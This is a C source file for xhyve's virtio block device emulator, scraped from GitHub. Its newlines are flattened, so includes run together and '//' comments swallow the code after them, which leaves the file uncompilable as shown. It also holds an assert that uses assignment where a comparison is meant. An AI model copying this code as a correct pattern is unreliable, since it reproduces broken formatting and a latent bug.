\* ARE DISCLAIMED. IN NO EVENT SHALL NETAPP, INC OR CONTRIBUTORS BE LIABLE \* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL \* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS \* OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) \* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT \* LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY \* OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF \* SUCH DAMAGE. \* \* $FreeBSD$ \*/
#include <stdint.h>#include <stdlib.h>#include <stdio.h>#include <string.h>#include <strings.h>#include <pthread.h>#include <fcntl.h>#include <unistd.h>#include <errno.h>#include <assert.h>#include <sys/param.h>#include <sys/stat.h>#include <sys/uio.h>#include <sys/ioctl.h>#include <sys/disk.h>#include <xhyve/support/misc.h>#include <xhyve/support/linker\_set.h>#include <xhyve/support/md5.h>#include <xhyve/xhyve.h>#include <xhyve/pci\_emul.h>#include <xhyve/virtio.h>#include <xhyve/block\_if.h>
#define VTBLK\_RINGSZ 128
#define VTBLK\_S\_OK 0#define VTBLK\_S\_IOERR 1#define VTBLK\_S\_UNSUPP 2
#define VTBLK\_BLK\_ID\_BYTES 20 + 1
/\* Capability bits \*/#define VTBLK\_F\_SEG\_MAX (1 << 2) /\* Maximum request segments \*/#define VTBLK\_F\_BLK\_SIZE (1 << 6) /\* cfg block size valid \*/#define VTBLK\_F\_FLUSH (1 << 9) /\* Cache flush support \*/#define VTBLK\_F\_TOPOLOGY (1 << 10) /\* Optimal I/O alignment \*/#define VTBLK\_F\_DISCARD (1 << 13) /\* Supports DISCARD / TRIM / WRITEZEROES \*/#define VTBLK\_F\_WRITE\_ZEROES (1 << 14)
/\* \* Host capabilities \*/#define VTBLK\_S\_HOSTCAPS \ ( VTBLK\_F\_SEG\_MAX | \ VTBLK\_F\_BLK\_SIZE | \ VTBLK\_F\_FLUSH | \ VTBLK\_F\_TOPOLOGY | \ VTBLK\_F\_DISCARD | \ VIRTIO\_RING\_F\_INDIRECT\_DESC ) /\* indirect descriptors \*/
/\* \* Config space "registers" \*/struct vtblk\_config { uint64\_t vbc\_capacity; uint32\_t vbc\_size\_max; uint32\_t vbc\_seg\_max; struct { uint16\_t cylinders; uint8\_t heads; uint8\_t sectors; } vbc\_geometry; uint32\_t vbc\_blk\_size; struct { uint8\_t physical\_block\_exp; uint8\_t alignment\_offset; uint16\_t min\_io\_size; uint32\_t opt\_io\_size; } vbc\_topology; uint8\_t vbc\_writeback; uint8\_t unused0[3]; uint32\_t max\_discard\_sectors; /\* in 512 byte units \*/ uint32\_t max\_discard\_seg; uint32\_t discard\_sector\_alignment; /\* in 512 byte units \*/ uint32\_t max\_write\_zeroes\_sectors; uint32\_t max\_write\_zeroes\_seg; uint8\_t write\_zeroes\_may\_unmap; uint8\_t unused1[3];} \_\_packed;
/\* \* Fixed-size block header \*/struct virtio\_blk\_hdr {#define VBH\_OP\_READ 0#define VBH\_OP\_WRITE 1#define VBH\_OP\_FLUSH 4#define VBH\_OP\_FLUSH\_OUT 5#define VBH\_OP\_IDENT 8#define VBH\_OP\_DISCARD 11#define VBH\_OP\_WRITE\_ZEROES 13#define VBH\_FLAG\_BARRIER 0x80000000 /\* OR'ed into vbh\_type \*/ uint32\_t vbh\_type; uint32\_t vbh\_ioprio; uint64\_t vbh\_sector;} \_\_packed;
static const char \*print\_vbh\_op(int op) { switch ((unsigned int)op & ~VBH\_FLAG\_BARRIER){ case VBH\_OP\_READ: return "READ"; case VBH\_OP\_WRITE: return "WRITE"; case VBH\_OP\_FLUSH: return "FLUSH"; case VBH\_OP\_FLUSH\_OUT: return "FLUSH\_OUT"; case VBH\_OP\_IDENT: return "IDENT"; case VBH\_OP\_DISCARD: return "DISCARD"; case VBH\_OP\_WRITE\_ZEROES: return "WRITE\_ZEROES"; } return "UNKNOWN";}
/\* \* Discard / write-zeroes segments \*/struct virtio\_blk\_discard\_write\_zeroes { uint64\_t sector; /\* starting offset in 512-byte units \*/ uint32\_t num\_sectors; /\* number of 512-byte units \*/ struct { uint32\_t unmap:1; uint32\_t reserved:31; } flags;} \_\_packed;
/\* \* Debug printf \*/static int pci\_vtblk\_debug;#define DPRINTF(params) if (pci\_vtblk\_debug) printf params
struct pci\_vtblk\_ioreq { struct blockif\_req io\_req; struct pci\_vtblk\_softc \*io\_sc; uint8\_t \*io\_status; uint16\_t io\_idx;};
/\* \* Per-device softc \*/struct pci\_vtblk\_softc { struct virtio\_softc vbsc\_vs; pthread\_mutex\_t vsc\_mtx; struct vqueue\_info vbsc\_vq; struct vtblk\_config vbsc\_cfg; struct blockif\_ctxt \*bc; char vbsc\_ident[VTBLK\_BLK\_ID\_BYTES]; struct pci\_vtblk\_ioreq vbsc\_ios[VTBLK\_RINGSZ];};
static void pci\_vtblk\_reset(void \*);static void pci\_vtblk\_notify(void \*, struct vqueue\_info \*);static int pci\_vtblk\_cfgread(void \*, int, int, uint32\_t \*);static int pci\_vtblk\_cfgwrite(void \*, int, int, uint32\_t);
static struct virtio\_consts vtblk\_vi\_consts\_defaults = { "vtblk", /\* our name \*/ 1, /\* we support 1 virtqueue \*/ sizeof(struct vtblk\_config), /\* config reg size \*/ pci\_vtblk\_reset, /\* reset \*/ pci\_vtblk\_notify, /\* device-wide qnotify \*/ pci\_vtblk\_cfgread, /\* read PCI config \*/ pci\_vtblk\_cfgwrite, /\* write PCI config \*/ NULL, /\* apply negotiated features \*/ VTBLK\_S\_HOSTCAPS, /\* our capabilities \*/};
static voidpci\_vtblk\_reset(void \*vsc){ struct pci\_vtblk\_softc \*sc = vsc;
 DPRINTF(("vtblk: device reset requested !\n")); vi\_reset\_dev(&sc->vbsc\_vs);}
/\* xhyve: FIXME \* \* pci\_vtblk\_done seems to deadlock when called from pci\_vtblk\_proc? \*/static voidpci\_vtblk\_done\_locked(struct blockif\_req \*br, int err){ struct pci\_vtblk\_ioreq \*io = br->br\_param; struct pci\_vtblk\_softc \*sc = io->io\_sc;
 /\* convert errno into a virtio block error return \*/ if (err == EOPNOTSUPP || err == ENOSYS) \*io->io\_status = VTBLK\_S\_UNSUPP; else if (err != 0) \*io->io\_status = VTBLK\_S\_IOERR; else \*io->io\_status = VTBLK\_S\_OK;
 /\* \* Return the descriptor back to the host. \* We wrote 1 byte (our status) to host. \*/ //pthread\_mutex\_lock(&sc->vsc\_mtx); vq\_relchain(&sc->vbsc\_vq, io->io\_idx, 1); vq\_endchains(&sc->vbsc\_vq, 0); //pthread\_mutex\_unlock(&sc->vsc\_mtx);}
static voidpci\_vtblk\_done(struct blockif\_req \*br, int err) { struct pci\_vtblk\_ioreq \*io = br->br\_param; struct pci\_vtblk\_softc \*sc = io->io\_sc;
 pthread\_mutex\_lock(&sc->vsc\_mtx); pci\_vtblk\_done\_locked(br, err); pthread\_mutex\_unlock(&sc->vsc\_mtx);}
static voidpci\_vtblk\_proc(struct pci\_vtblk\_softc \*sc, struct vqueue\_info \*vq){ struct virtio\_blk\_hdr \*vbh; struct virtio\_blk\_discard\_write\_zeroes \*vbdiscard; struct pci\_vtblk\_ioreq \*io; int i, n; int err; ssize\_t iolen; int expectro, type; struct iovec iov[BLOCKIF\_IOV\_MAX + 2]; uint16\_t idx, flags[BLOCKIF\_IOV\_MAX + 2];
 n = vq\_getchain(vq, &idx, iov, BLOCKIF\_IOV\_MAX + 2, flags);
 /\* \* The first descriptor will be the read-only fixed header, \* and the last is for status (hence +2 above and below). \* The remaining iov's are the actual data I/O vectors. \* \* XXX - note - this fails on crash dump, which does a \* VIRTIO\_BLK\_T\_FLUSH with a zero transfer length \*/ assert(n >= 2 && n <= BLOCKIF\_IOV\_MAX + 2);
 io = &sc->vbsc\_ios[idx]; assert((flags[0] & VRING\_DESC\_F\_WRITE) == 0); assert(iov[0].iov\_len == sizeof(struct virtio\_blk\_hdr)); vbh = iov[0].iov\_base; memcpy(&io->io\_req.br\_iov, &iov[1], sizeof(struct iovec) \* ((size\_t)n - 2)); io->io\_req.br\_iovcnt = n - 2; io->io\_req.br\_offset = (off\_t)(vbh->vbh\_sector \* DEV\_BSIZE); io->io\_status = iov[--n].iov\_base; assert(iov[n].iov\_len == 1); assert(flags[n] & VRING\_DESC\_F\_WRITE);
 /\* \* XXX \* The guest should not be setting the BARRIER flag because \* we don't advertise the capability. \*/ type = vbh->vbh\_type & ~VBH\_FLAG\_BARRIER; expectro = (type == VBH\_OP\_WRITE) || (type == VBH\_OP\_DISCARD); iolen = 0; for (i = 1; i < n; i++) { /\* \* - write/discard op implies read-only descriptor, \* - read/ident op implies write-only descriptor, \* therefore test the inverse of the descriptor bit \* to the op. \*/ assert(((flags[i] & VRING\_DESC\_F\_WRITE) == 0) == expectro); iolen += iov[i].iov\_len; } io->io\_req.br\_resid = iolen;
 DPRINTF(("virtio-block: %s op, %zd bytes, %d segs\n\r", print\_vbh\_op(type), iolen, i - 1));
 switch (type) { case VBH\_OP\_READ: err = blockif\_read(sc->bc, &io->io\_req); break; case VBH\_OP\_WRITE: err = blockif\_write(sc->bc, &io->io\_req); break; case VBH\_OP\_DISCARD: /\* We currently limit the discard to one segment in the initial negotiation so expect exactly one correctly-sized payload descriptor. \*/ assert(iov[1].iov\_len = sizeof(struct virtio\_blk\_discard\_write\_zeroes)); assert(n == 2); vbdiscard = iov[1].iov\_base; io->io\_req.br\_offset = (off\_t) vbdiscard->sector \* DEV\_BSIZE; io->io\_req.br\_resid = vbdiscard->num\_sectors \* DEV\_BSIZE; err = blockif\_delete(sc->bc, &io->io\_req); break; case VBH\_OP\_FLUSH: case VBH\_OP\_FLUSH\_OUT: err = blockif\_flush(sc->bc, &io->io\_req); break; case VBH\_OP\_IDENT: /\* Assume a single buffer \*/ /\* S/n equal to buffer is not zero-terminated. \*/ memset(iov[1].iov\_base, 0, iov[1].iov\_len); strncpy(iov[1].iov\_base, sc->vbsc\_ident, MIN(iov[1].iov\_len, sizeof(sc->vbsc\_ident))); /\* xhyve: FIXME \*/ pci\_vtblk\_done\_locked(&io->io\_req, 0); return; default: /\* xhyve: FIXME \*/ pci\_vtblk\_done\_locked(&io->io\_req, EOPNOTSUPP); return; } assert(err == 0);}
static voidpci\_vtblk\_notify(void \*vsc, struct vqueue\_info \*vq){ struct pci\_vtblk\_softc \*sc = vsc;
 while (vq\_has\_descs(vq)) pci\_vtblk\_proc(sc, vq);}
static intpci\_vtblk\_init(struct pci\_devinst \*pi, char \*opts){ char bident[sizeof("XX:X:X")]; struct blockif\_ctxt \*bctxt; MD5\_CTX mdctx; u\_char digest[16]; struct pci\_vtblk\_softc \*sc; off\_t size; int i, sectsz, sts, sto; struct virtio\_consts \*vi\_consts;
 if (opts == NULL) { printf("virtio-block: backing device required\n"); return (1); }
 /\* \* The supplied backing file has to exist \*/ snprintf(bident, sizeof(bident), "%d:%d", pi->pi\_slot, pi->pi\_func); bctxt = blockif\_open(opts, bident, 0); if (bctxt == NULL) { perror("Could not open backing file"); return (1); }
 size = blockif\_size(bctxt); sectsz = blockif\_sectsz(bctxt); blockif\_psectsz(bctxt, &sts, &sto);
 sc = calloc(1, sizeof(struct pci\_vtblk\_softc)); sc->bc = bctxt; for (i = 0; i < VTBLK\_RINGSZ; i++) { struct pci\_vtblk\_ioreq \*io = &sc->vbsc\_ios[i]; io->io\_req.br\_callback = pci\_vtblk\_done; io->io\_req.br\_param = io; io->io\_sc = sc; io->io\_idx = (uint16\_t)i; }
 pthread\_mutex\_init(&sc->vsc\_mtx, NULL);
 /\* Customise the capabilities per-device \*/ vi\_consts = (struct virtio\_consts\*)malloc(sizeof(struct virtio\_consts)); if (vi\_consts == NULL){ perror("Failed to allocate buffer for virtio\_consts"); return (1); } \*vi\_consts = vtblk\_vi\_consts\_defaults; if (!blockif\_candelete(bctxt)){ /\* Don't tell the guest we can discard if the backing device doesn't support it \*/ vi\_consts->vc\_hv\_caps &= ~(uint64\_t)VTBLK\_F\_DISCARD; }
 /\* init virtio softc and virtqueues \*/ vi\_softc\_linkup(&sc->vbsc\_vs, vi\_consts, sc, pi, &sc->vbsc\_vq); sc->vbsc\_vs.vs\_mtx = &sc->vsc\_mtx;
 sc->vbsc\_vq.vq\_qsize = VTBLK\_RINGSZ; /\* sc->vbsc\_vq.vq\_notify = we have no per-queue notify \*/
 /\* \* Create an identifier for the backing file. Use parts of the \* md5 sum of the filename \*/ MD5Init(&mdctx); MD5Update(&mdctx, opts, (unsigned)strlen(opts)); MD5Final(digest, &mdctx); snprintf(sc->vbsc\_ident, VTBLK\_BLK\_ID\_BYTES, "BHYVE-%02X%02X-%02X%02X-%02X%02X", digest[0], digest[1], digest[2], digest[3], digest[4], digest[5]);
 /\* setup virtio block config space \*/ sc->vbsc\_cfg.vbc\_capacity = (uint64\_t)(size / DEV\_BSIZE); /\* 512-byte units \*/ sc->vbsc\_cfg.vbc\_size\_max = 0; /\* not negotiated \*/ sc->vbsc\_cfg.vbc\_seg\_max = BLOCKIF\_IOV\_MAX; sc->vbsc\_cfg.max\_discard\_sectors = 1024 \* 1024 \* 1024 / DEV\_BSIZE; /\* 1 GiB in 512-byte sectors \*/ sc->vbsc\_cfg.max\_discard\_seg = 1; /\* one offset, length range per request \*/ sc->vbsc\_cfg.discard\_sector\_alignment = 1; /\* 512-byte units \*/ sc->vbsc\_cfg.vbc\_geometry.cylinders = 0; /\* no geometry \*/ sc->vbsc\_cfg.vbc\_geometry.heads = 0; sc->vbsc\_cfg.vbc\_geometry.sectors = 0; sc->vbsc\_cfg.vbc\_blk\_size = (uint32\_t)sectsz; sc->vbsc\_cfg.vbc\_topology.physical\_block\_exp = (uint8\_t)((sts > sectsz) ? (ffsll(sts / sectsz) - 1) : 0); sc->vbsc\_cfg.vbc\_topology.alignment\_offset = (uint8\_t)((sto != 0) ? ((sts - sto) / sectsz) : 0); sc->vbsc\_cfg.vbc\_topology.min\_io\_size = 0; sc->vbsc\_cfg.vbc\_topology.opt\_io\_size = 0; sc->vbsc\_cfg.vbc\_writeback = 0;
 /\* \* Should we move some of this into virtio.c? Could \* have the device, class, and subdev\_0 as fields in \* the virtio constants structure. \*/ pci\_set\_cfgdata16(pi, PCIR\_DEVICE, VIRTIO\_DEV\_BLOCK); pci\_set\_cfgdata16(pi, PCIR\_VENDOR, VIRTIO\_VENDOR); pci\_set\_cfgdata8(pi, PCIR\_CLASS, PCIC\_STORAGE); pci\_set\_cfgdata16(pi, PCIR\_SUBDEV\_0, VIRTIO\_TYPE\_BLOCK); pci\_set\_cfgdata16(pi, PCIR\_SUBVEND\_0, VIRTIO\_VENDOR);
 if (vi\_intr\_init(&sc->vbsc\_vs, 1, fbsdrun\_virtio\_msix())) { blockif\_close(sc->bc); free(sc); return (1); } vi\_set\_io\_bar(&sc->vbsc\_vs, 0); return (0);}
static intpci\_vtblk\_cfgwrite(UNUSED void \*vsc, int offset, UNUSED int size, UNUSED uint32\_t value){ DPRINTF(("vtblk: write to readonly reg %d\n\r", offset)); return (1);}
static intpci\_vtblk\_cfgread(void \*vsc, int offset, int size, uint32\_t \*retval){ struct pci\_vtblk\_softc \*sc = vsc; void \*ptr;
 /\* our caller has already verified offset and size \*/ ptr = (uint8\_t \*)&sc->vbsc\_cfg + offset; memcpy(retval, ptr, size); return (0);}
static struct pci\_devemu pci\_de\_vblk = { .pe\_emu = "virtio-blk", .pe\_init = pci\_vtblk\_init, .pe\_barwrite = vi\_pci\_write, .pe\_barread = vi\_pci\_read};PCI\_EMUL\_SET(pci\_de\_vblk);

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


